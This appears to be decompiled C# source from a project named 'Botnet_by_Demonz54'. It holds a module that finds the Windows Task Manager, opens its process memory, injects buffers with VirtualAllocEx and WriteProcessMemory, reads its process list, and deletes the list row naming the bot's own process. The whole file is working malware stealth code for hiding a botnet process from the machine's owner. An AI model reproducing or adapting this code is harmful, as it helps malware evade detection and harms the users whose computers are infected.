using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32.SafeHandles;

namespace Botnet_by_Demonz54;

[StandardModule]
internal sealed class GetItems
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct LV_ITEM
	{
		public uint mask;

		public int iItem;

		public int iSubItem;

		public uint state;

		public uint stateMask;

		public IntPtr pszText;

		public int cchTextMax;

		public int iImage;

		public IntPtr lParam;

		public int iIndent;

		public int iGroupId;

		public int cColumns;

		public IntPtr puColumns;

		public IntPtr piColFmt;

		public int iGroup;

		public int Size()
		{
			return Marshal.SizeOf((object)this);
		}
	}

	public struct HDITEM
	{
		public uint mask;

		public int cxy;

		public IntPtr pszText;

		public IntPtr hbm;

		public int cchTextMax;

		public int fmt;

		public IntPtr lParam;

		public int iImage;

		public int iOrder;

		public int Size()
		{
			return Marshal.SizeOf((object)this);
		}
	}

	internal sealed class SafeProcessHandle : SafeHandleZeroOrMinusOneIsInvalid
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);

		public SafeProcessHandle()
			: base(ownsHandle: true)
		{
		}

		public SafeProcessHandle(IntPtr handle)
			: base(ownsHandle: true)
		{
			SetHandle(handle);
		}

		protected override bool ReleaseHandle()
		{
			return CloseHandle(handle);
		}
	}

	private static IntPtr listViewHandle;

	public const uint LVM_FIRST = 4096u;

	public const uint LVM_DELETEITEM = 4104u;

	public const string kernel32 = "kernel32";

	public const string user32 = "user32";

	public const uint LVM_GETITEMCOUNT = 4100u;

	public const uint LVM_GETITEMTEXT = 4141u;

	public const uint LVM_GETHEADER = 4127u;

	public const uint HDM_GETIEMA = 4611u;

	public const uint HDM_GETITEMW = 4619u;

	public const uint HDM_GETITEMCOUNT = 4608u;

	public const uint HDM_GETUNICODEFORMAT = 8198u;

	public const uint HDI_TEXT = 2u;

	public const uint MEM_COMMIT = 4096u;

	public const uint MEM_RELEASE = 32768u;

	public const uint PAGE_READWRITE = 4u;

	public const uint PROCESS_VM_READ = 16u;

	public const uint PROCESS_VM_WRITE = 32u;

	public const uint PROCESS_VM_OPERATION = 8u;

	public const uint WM_GETTEXT = 13u;

	public const uint WM_GETTEXTLENGTH = 14u;

	[DllImport("kernel32", SetLastError = true)]
	public static extern SafeProcessHandle OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32", CharSet = CharSet.Unicode, EntryPoint = "ReadProcessMemory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory_1(SafeProcessHandle hProcess, IntPtr lpBaseAddress, StringBuilder lpBuffer, int nSize, ref int bytesRead);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, StringBuilder lpBuffer, int nSize, ref int bytesRead);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref LV_ITEM lpBuffer, int nSize, ref int bytesRead);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref HDITEM lpBuffer, int nSize, ref int bytesRead);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ReadProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize, ref int bytesRead);

	[DllImport("user32", SetLastError = true)]
	public static extern int SendMessage(IntPtr hWnd, uint message, IntPtr wParam, IntPtr lParam);

	[DllImport("user32", SetLastError = true)]
	public static extern IntPtr SendMessageA(IntPtr hWnd, uint message, IntPtr wParam, IntPtr lParam);

	[DllImport("user32", SetLastError = true)]
	public static extern int SendMessage(IntPtr hWnd, uint message, int wParam, StringBuilder lParam);

	[DllImport("user32", SetLastError = true)]
	public static extern int SendMessage(IntPtr hWnd, uint message, int wParam, IntPtr lParam);

	[DllImport("kernel32", SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(SafeProcessHandle hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool VirtualFreeEx(SafeProcessHandle hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref LV_ITEM lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

	[DllImport("kernel32", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WriteProcessMemory(SafeProcessHandle hProcess, IntPtr lpBaseAddress, ref HDITEM lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

	public static bool GetListView(IntPtr handle, IntPtr lvhandle)
	{
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		listViewHandle = lvhandle;
		int num = -1;
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				if (Operators.CompareString(process.MainWindowTitle, "Windows Task Manager", false) == 0)
				{
					num = process.Id;
				}
			}
			if (num == -1)
			{
				throw new ArgumentException("Could not find the process specified", "processName");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		SafeProcessHandle safeProcessHandle = null;
		checked
		{
			try
			{
				safeProcessHandle = OpenProcess(56u, bInheritHandle: false, num);
				if (safeProcessHandle == null && Marshal.GetLastWin32Error() == 0)
				{
					throw new Win32Exception();
				}
				int num2 = SendMessage(listViewHandle, 4100u, IntPtr.Zero, IntPtr.Zero);
				int num3 = num2 - 1;
				for (int j = 0; j <= num3; j++)
				{
					ListViewItem val = new ListViewItem(GetItem(j, 0, safeProcessHandle));
					if (val.get_Text().Contains(TMListViewDelete.MyProc))
					{
						SendMessage(listViewHandle, 4104u, j, IntPtr.Zero);
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			finally
			{
				if (safeProcessHandle != null)
				{
					safeProcessHandle.Close();
					safeProcessHandle.Dispose();
				}
			}
			return true;
		}
	}

	private static string GetItem(int row, int subitem, SafeProcessHandle hProcess)
	{
		LV_ITEM lpBuffer = default(LV_ITEM);
		lpBuffer.cchTextMax = 260;
		lpBuffer.mask = 1u;
		lpBuffer.iItem = row;
		lpBuffer.iSubItem = subitem;
		StringBuilder stringBuilder = new StringBuilder(260);
		IntPtr intPtr = default(IntPtr);
		try
		{
			intPtr = (lpBuffer.pszText = VirtualAllocEx(hProcess, IntPtr.Zero, 260, 4096u, 4u));
			IntPtr intPtr2 = default(IntPtr);
			try
			{
				intPtr2 = VirtualAllocEx(hProcess, IntPtr.Zero, lpBuffer.Size(), 4096u, 4u);
				IntPtr lpBaseAddress = intPtr2;
				int nSize = lpBuffer.Size();
				int lpNumberOfBytesWritten = 0;
				if (!WriteProcessMemory(hProcess, lpBaseAddress, ref lpBuffer, nSize, ref lpNumberOfBytesWritten))
				{
					throw new Win32Exception();
				}
				SendMessage(listViewHandle, 4141u, row, intPtr2);
				IntPtr lpBaseAddress2 = intPtr;
				lpNumberOfBytesWritten = 0;
				if (!ReadProcessMemory(hProcess, lpBaseAddress2, stringBuilder, 260, ref lpNumberOfBytesWritten))
				{
					throw new Win32Exception();
				}
				IntPtr lpBaseAddress3 = intPtr2;
				int nSize2 = Marshal.SizeOf((object)lpBuffer);
				lpNumberOfBytesWritten = 0;
				if (!ReadProcessMemory(hProcess, lpBaseAddress3, ref lpBuffer, nSize2, ref lpNumberOfBytesWritten))
				{
					throw new Win32Exception();
				}
			}
			finally
			{
				if (!intPtr2.Equals((object?)(nint)IntPtr.Zero) && !VirtualFreeEx(hProcess, intPtr2, 0, 32768u))
				{
					throw new Win32Exception();
				}
			}
		}
		finally
		{
			if (!intPtr.Equals((object?)(nint)IntPtr.Zero) && !VirtualFreeEx(hProcess, intPtr, 0, 32768u))
			{
				throw new Win32Exception();
			}
		}
		return stringBuilder.ToString();
	}
}
